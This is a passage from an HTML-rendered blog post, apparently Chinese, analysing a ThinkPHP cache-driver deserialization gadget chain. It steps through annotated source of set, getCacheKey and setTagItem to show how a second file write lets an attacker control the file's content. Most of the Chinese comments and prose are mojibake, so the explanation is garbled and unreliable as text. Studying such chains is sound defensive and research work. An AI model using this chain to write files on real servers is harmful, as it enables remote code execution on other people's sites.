class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å†™å…¥ç¼“å­˜</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string            $name ç¼“å­˜å˜é‡å = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed             $value  å­˜å‚¨æ•°æ® = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> integer|\DateTime $expire  æœ‰æ•ˆæ—¶é—´ï¼ˆç§’ï¼‰= 0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// âŒ $expire ä¸ä¸º nullï¼Œä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// âŒ $expire ä¸æ˜¯ DateTime çš„å®ä¾‹ï¼Œä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¦‚æœæ²¡æœ‰ $name å¯¹åº”çš„ç¼“å­˜æ–‡ä»¶åˆ™ $this-&gt;has($name) è¿”å› false</span></span><br><span class="line">    <span class="comment">// âœ… å› æ­¤è¿›å…¥åˆ¤æ–­è®¾ç½® $first = true</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å› ä¸º $this-&gt;options[&#x27;prefix&#x27;] = &#x27;&#x27; æ‰€ä»¥ getCacheKey ç›´æ¥è¿”å› $name</span></span><br><span class="line">    <span class="comment">// å› æ­¤è¿™é‡Œç­‰ä»·äº $key = $name</span></span><br><span class="line">    <span class="variable">$key</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 0 == $expire æ»¡è¶³æ¡ä»¶å› æ­¤ $expire = 0</span></span><br><span class="line">    <span class="variable">$expire</span> = <span class="number">0</span> == <span class="variable">$expire</span> ? <span class="number">0</span> : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_TIME&#x27;</span>] + <span class="variable">$expire</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ğŸ“Œ é¦–å…ˆè°ƒç”¨ $this-&gt;handler-&gt;set ç¬¬ä¸€æ¬¡å†™å…¥æ–‡ä»¶ï¼Œæ­¤å¤„æ–‡ä»¶å†…å®¹ä¸å¯æ§ã€‚</span></span><br><span class="line">    <span class="comment">// $key = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27; ç»è¿‡è½¬æ¢å˜ä¸ºæ–‡ä»¶å</span></span><br><span class="line">    <span class="comment">// $value = true ç»è¿‡åºåˆ—åŒ–å’Œæ‹¼æ¥ç­‰æ“ä½œå˜æˆæ–‡ä»¶å†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="comment">// ç”±äºå‰é¢è®¾ç½® $first = true</span></span><br><span class="line">        <span class="comment">// å› æ­¤è°ƒç”¨ $this-&gt;setTagItem â†’ $this-&gt;set å†æ¬¡è°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">        <span class="comment">// ç”±äºæ­¤æ—¶ç»è¿‡å‚æ•°è½¬æ¢åæ–‡ä»¶å†…å®¹ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥</span></span><br><span class="line">        <span class="comment">// ğŸ“Œ å› æ­¤ $this-&gt;handler-&gt;set å®Œæˆç¬¬äºŒæ¬¡å†™å…¥æ—¶æ–‡ä»¶å†…å®¹å¯æ§</span></span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨  <code>set</code> å‡½æ•°ä¸­çœŸæ­£è¿›è¡Œæ–‡ä»¶å†™å…¥æ“ä½œæ˜¯é€šè¿‡è°ƒç”¨ <code>$this-&gt;handler-&gt;set</code> å®Œæˆçš„ã€‚å½“ <code>handler</code> æˆå‘˜æŒ‡å‘ <code>think\cache\driver\File</code> å¯¹è±¡æ—¶ï¼Œå¯¹åº”çš„ <code>$this-&gt;handler-&gt;set</code> å‡½æ•°å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å†™å…¥ç¼“å­˜</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string            $name ç¼“å­˜å˜é‡å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed             $value  å­˜å‚¨æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> integer|\DateTime $expire  æœ‰æ•ˆæ—¶é—´ï¼ˆç§’ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;<span class="title function_ invoke__">getTimestamp</span>() - <span class="title function_ invoke__">time</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å°† $name è½¬æ¢æˆè¦ä¿å­˜çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆ›å»ºç›®å½•</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $this-&gt;tag = true ä¸”æ–‡ä»¶ä¸å­˜åœ¨åˆ™è¡¨ç¤ºç¬¬ä¸€æ¬¡åˆ›å»ºï¼Œ$first = true</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å°†è¦å†™å…¥çš„å€¼ $value åºåˆ—åŒ–ä¸€ä¸‹</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¦‚æœ $this-&gt;options[&#x27;data_compress&#x27;] = true åˆ™ä¼šå°†æ•°æ®å‹ç¼©</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å°†è¦å†™å…¥çš„æ•°æ®å’Œä¸€æ®µ PHP ä»£ç æ‹¼æ¥</span></span><br><span class="line">    <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å‘ $filename æ–‡ä»¶å†™å…¥æ•°æ® $data</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¦‚æœæˆåŠŸå†™å…¥æ•°æ®</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å†™å…¥åˆ™ä¼šè°ƒç”¨ think\cache\Driver çš„ setTagItem æ–¹æ³•æ›´æ–°æ ‡ç­¾</span></span><br><span class="line">        <span class="comment">// è¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨ $this-&gt;set å‡½æ•°å†æ¬¡è¿›è¡Œæ–‡ä»¶å†™å…¥</span></span><br><span class="line">        <span class="comment">// ä¸”æ­¤æ—¶ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥è®¾ç½®ä¸ºè¿™é‡Œä¼ å…¥çš„ $filename</span></span><br><span class="line">        <span class="comment">// è¨€å¤–ä¹‹æ„å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é‡Œçš„ $filename æ§åˆ¶å†™å…¥å†…å®¹</span></span><br><span class="line">        <span class="comment">// ç„¶è€Œè¿™é‡Œçš„ $filename æ˜¯è¦å†™å…¥å†…å®¹çš„ md5 æ‹¼æ¥å‡ºæ¥çš„ï¼Œä¸å¯æ§</span></span><br><span class="line">        <span class="comment">// å› æ­¤ä¸ä¼šä½¿ç”¨è¿™é‡Œçš„è°ƒç”¨ç‚¹æ„é€ ååºåˆ—åŒ–é“¾ï¼Œä¹Ÿå°±æ˜¯ $this-&gt;tag = false</span></span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="title function_ invoke__">clearstatcache</span>(); <span class="comment">// æ›´æ–°æ–‡ä»¶ç¼“å­˜</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>$this-&gt;handler-&gt;set</code> å‡½æ•°é¦–å…ˆä¼šå¯¹ <code>$expire</code> åšä¸€äº›åˆ¤æ–­å’Œè½¬æ¢ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯æ•°å­—ï¼Œå› æ­¤å®é™…ä¸Šå¹¶æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">    <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">    <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;<span class="title function_ invoke__">getTimestamp</span>() - <span class="title function_ invoke__">time</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åä¼šè°ƒç”¨çˆ¶ç±» <code>Driver</code> çš„ <code>getCacheKey</code> æ–¹æ³•å°†ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° <code>$name</code> è½¬æ¢ä¸ºè¦å†™å…¥çš„æ–‡ä»¶çš„åå­—ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å–å¾—å˜é‡çš„å­˜å‚¨æ–‡ä»¶å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name ç¼“å­˜å˜é‡å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  bool   $auto æ˜¯å¦è‡ªåŠ¨åˆ›å»ºç›®å½•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>); <span class="comment">// å¯¹ $name ç®—ä¸€æ¬¡ md5</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// âŒ $this-&gt;options[&#x27;cache_subdir&#x27;] = &#x27;&#x27; ä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨å­ç›®å½•</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// âŒ $this-&gt;options[&#x27;prefix&#x27;] = &#x27;&#x27; ä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $this-&gt;options[&#x27;path&#x27;] æ˜¯æˆ‘ä»¬è®¾ç½®çš„è·¯å¾„ï¼Œä¼šæ‹¼æ¥ä¸Š md5($name) å’Œ &#x27;.php&#x27;</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$dir</span>      = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ $auto = true ä¼šåˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filename</span>; <span class="comment">// è¿”å›è½¬æ¢åçš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åå¦‚æœ <code>$this-&gt;tag</code> ä¸º <code>true</code> ä¸”æ–‡ä»¶ä¸å­˜åœ¨è¯´æ˜æ˜¯ç¬¬ä¸€æ¬¡å†™å…¥ã€‚å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å†™å…¥ï¼Œåˆ™åœ¨å®Œæˆæ–‡ä»¶å†™å…¥ä¹‹åè¿˜ä¼šè°ƒç”¨ <code>think\cache\Driver-&gt;setTagItem</code> å‡½æ•°å†æ¬¡å†™å…¥æ–‡ä»¶ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $this-&gt;tag = true ä¸”æ–‡ä»¶ä¸å­˜åœ¨åˆ™è¡¨ç¤ºç¬¬ä¸€æ¬¡åˆ›å»ºï¼Œ$first = true</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸­é—´å¯¹å†™å…¥çš„æ•°æ® $data åšä¸€äº›è½¬æ¢</span></span><br><span class="line"><span class="comment">// [....]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘ $filename æ–‡ä»¶å†™å…¥æ•°æ® $data</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœæˆåŠŸå†™å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å†™å…¥åˆ™ä¼šè°ƒç”¨ think\cache\Driver çš„ setTagItem æ–¹æ³•æ›´æ–°æ ‡ç­¾</span></span><br><span class="line">    <span class="comment">// è¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨ $this-&gt;set å‡½æ•°å†æ¬¡è¿›è¡Œæ–‡ä»¶å†™å…¥</span></span><br><span class="line">    <span class="comment">// ä¸”æ­¤æ—¶ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥è®¾ç½®ä¸ºè¿™é‡Œä¼ å…¥çš„ $filename</span></span><br><span class="line">    <span class="comment">// è¨€å¤–ä¹‹æ„å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é‡Œçš„ $filename æ§åˆ¶å†™å…¥å†…å®¹</span></span><br><span class="line">    <span class="comment">// ç„¶è€Œè¿™é‡Œçš„ $filename æ˜¯è¦å†™å…¥å†…å®¹çš„ md5 æ‹¼æ¥å‡ºæ¥çš„ï¼Œä¸å¯æ§</span></span><br><span class="line">    <span class="comment">// å› æ­¤ä¸ä¼šä½¿ç”¨è¿™é‡Œçš„è°ƒç”¨ç‚¹æ„é€ ååºåˆ—åŒ–é“¾ï¼Œä¹Ÿå°±æ˜¯ $this-&gt;tag = false</span></span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">clearstatcache</span>(); <span class="comment">// æ›´æ–°æ–‡ä»¶ç¼“å­˜</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœæˆ‘ä»¬è®¾ç½® <code>$this-&gt;tag = true</code> åˆ™ <code>setTagItem</code> ä¼šè°ƒç”¨ <code>$this-&gt;set</code> å°† <code>$name</code> å†™å…¥æ–‡ä»¶ã€‚ç„¶è€Œè¿™é‡Œä¼ å…¥çš„ <code>$name</code> æ˜¯ç»è¿‡ <code>getCacheKey</code> å‡½æ•°åšè¿‡å“ˆå¸Œè¿ç®—çš„å†…å®¹ï¼Œå®é™…ä¸Šæ˜¯ä¸å¯æ§çš„ã€‚å› æ­¤æˆ‘ä»¬ä¸èƒ½é€šè¿‡è¿™æ¡é“¾å®Œæˆæ–‡ä»¶å†™å…¥ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ›´æ–°æ ‡ç­¾</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name ç¼“å­˜æ ‡è¯†</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag) &#123;</span><br><span class="line">        <span class="variable">$key</span>       = <span class="string">&#x27;tag_&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;tag);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tag = <span class="literal">null</span>; <span class="comment">// ä¸ºäº†é˜²æ­¢æ— é™é€’å½’ï¼Œè¿™é‡Œä¼šå°† $this-&gt;tag è®¾ç½®ä¸º null</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœå­˜åœ¨ $key å¯¹åº”çš„æ–‡ä»¶</span></span><br><span class="line">            <span class="comment">// é‚£ä¹ˆå…ˆå°†æ–‡ä»¶ä¸­çš„å†…å®¹è¯»å‡ºï¼Œå¹¶ä»¥ &#x27;,&#x27; ä¸ºåˆ†éš”è½¬æ¢ä¸ºæ•°ç»„</span></span><br><span class="line">            <span class="variable">$value</span>   = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>));</span><br><span class="line">            <span class="comment">// åœ¨æ•°ç»„æœ«å°¾æ’å…¥ $name</span></span><br><span class="line">            <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">            <span class="comment">// æ•°ç»„å»é‡åä»¥ &#x27;,&#x27; ä¸ºåˆ†éš”è½¬æ¢æˆå­—ç¬¦ä¸²ä½œä¸ºè¦å†™å…¥æ–‡ä»¶çš„å†…å®¹</span></span><br><span class="line">            <span class="variable">$value</span>   = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_unique</span>(<span class="variable">$value</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœä¸å­˜åœ¨ $key å¯¹åº”çš„æ–‡ä»¶</span></span><br><span class="line">            <span class="comment">// åˆ™ç›´æ¥è®¾ç½® $name ä¸ºè¦å†™å…¥æ–‡ä»¶çš„å†…å®¹</span></span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ $this-&gt;set å°† $value å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶å <code>File-&gt;set</code> åœ¨æ–‡ä»¶å†™å…¥è¿™å—ä¸»è¦æ˜¯å°†å†™å…¥å†…å®¹ <code>$value</code> åšäº†å¦‚ä¸‹è½¬æ¢ï¼š</p>
<ol>
<li>å°†å†™å…¥æ•°æ®è¿›è¡Œåºåˆ—åŒ–ã€‚</li>
<li>å¦‚æœ <code>$this-&gt;options[&#39;data_compress&#39;] = true</code> è¿˜ä¼šå°†å†™å…¥æ•°æ®è¿›è¡Œ gzip å‹ç¼©ï¼Œä¸è¿‡è¿™é‡Œæˆ‘ä»¬ä¸ºäº†æ§åˆ¶æ–‡ä»¶å†…å®¹é€šå¸¸è®¾ç½® <code>$this-&gt;options[&#39;data_compress&#39;] = false</code>ã€‚</li>
<li>åœ¨å†™å…¥æ•°æ®å‰æ‹¼æ¥ä¸€æ®µ PHP ä»£ç ï¼š<code>&quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot;</code>ã€‚</li>
</ol>
